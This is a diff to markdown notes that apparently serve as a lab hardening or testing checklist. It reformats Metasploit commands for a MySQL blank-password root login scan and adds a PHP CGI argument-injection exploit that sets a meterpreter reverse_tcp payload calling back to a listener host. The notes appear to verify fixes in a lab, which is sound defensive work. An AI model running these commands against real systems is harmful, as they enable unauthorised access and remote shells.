@@ -150,8 +150,18 @@ Verify port 3632 is no longer listening
 5. MySQL
 
 Test Kali:
-`use auxiliary/scanner/mysql/mysql_login
-set BLANK_PASSWORDS true
-set RHOSTS 172.16.30.60
-set USERNAME root
-exploit`
+- `use auxiliary/scanner/mysql/mysql_login`
+- `set BLANK_PASSWORDS true`
+- `set RHOSTS 172.16.30.60`
+- `set USERNAME root`
+- `exploit`
+
+6. PHP CGI
+
+test kali:
+- `use exploit/multi/http/php_cgi_arg_injection`
+- `set PAYLOAD php/meterpreter/reverse_tcp`
+- `set RHOST 172.16.30.60`
+- `set LHOST 172.16.30.75`
+- `run`
+
